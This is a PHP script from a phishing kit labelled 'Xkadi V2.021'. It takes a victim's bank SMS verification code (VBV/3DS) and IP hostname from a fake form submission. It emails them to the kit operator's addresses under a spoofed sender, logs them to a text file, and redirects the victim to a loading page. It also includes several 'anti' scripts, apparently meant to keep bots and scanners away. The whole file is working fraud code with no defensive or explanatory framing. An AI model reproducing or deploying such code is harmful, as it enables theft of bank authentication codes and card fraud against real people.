<?php
	
include '../../../prevents/anti1.php';
include '../../../prevents/anti2.php';
include '../../../prevents/anti3.php';
include '../../../prevents/anti4.php';
include '../../../prevents/anti5.php';
include '../../../prevents/anti6.php';
include '../../../prevents/anti7.php';
include '../../../prevents/anti8.php';
include '../../../prevents/anti9.php';
	include '../email.php';
	include'../get_browser.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[----------Xkadi V2.021--------]\n";
$message .= "SMS[VBV/3DS] : ".$_POST['bankid']."\n";
$message .= "ADRESSE IP    : $hostname\n";
$message .= "[----------Xkadi V2.021--------]\n";
$Subject= "SMS VBV/3DS [1/3] "._ip();
$head="From: *.* -PSA7TK-KADI- *.*  <vbv@rezzz.com>";
if(mail($my_mail,$Subject,$message,$head) && mail($binn,$Subject,$message,$head)) ;
$fp = fopen("vbv1.txt", "a +");
			fputs($fp, $message);
			fclose($fp);

     echo "<meta http-equiv='refresh' content='0; url=./load1.php' />";

?>
